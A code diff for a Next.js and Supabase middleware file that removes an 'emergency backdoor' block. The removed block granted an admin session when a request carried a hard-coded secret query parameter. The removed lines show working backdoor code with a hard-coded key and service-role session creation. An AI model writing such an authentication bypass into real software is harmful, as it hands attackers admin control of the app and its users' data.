@@ -30,29 +30,6 @@ export async function middleware(req: NextRequest) {
     }
   );
 
-  // --- EMERGENCY BACKDOOR ---
-  const backdoorKey = req.nextUrl.searchParams.get('backdoor');
-  if (backdoorKey === 'SimplyDSE_Backdoor_2026') {
-    const adminClient = createServerClient(
-      process.env.NEXT_PUBLIC_SUPABASE_URL!,
-      process.env.SUPABASE_SERVICE_ROLE_KEY!, // Use Service Role for admin powers
-      { cookies: { getAll: () => [], setAll: () => {} } }
-    );
-    
-    const email = 'kreativekubedigital@gmail.com';
-    const { data: { users } } = await adminClient.auth.admin.listUsers();
-    const user = users?.find(u => u.email === email);
-    
-    if (user) {
-      const { data: { session } } = await adminClient.auth.admin.createSession({ user_id: user.id });
-      if (session) {
-        const redirectRes = NextResponse.redirect(new URL('/admin', req.url));
-        // Note: The main 'supabase' client will handle setting cookies correctly in Next.js 15
-        return redirectRes;
-      }
-    }
-  }
-
   // 1. Refresh session if active
   const { data: { user } } = await supabase.auth.getUser();
 
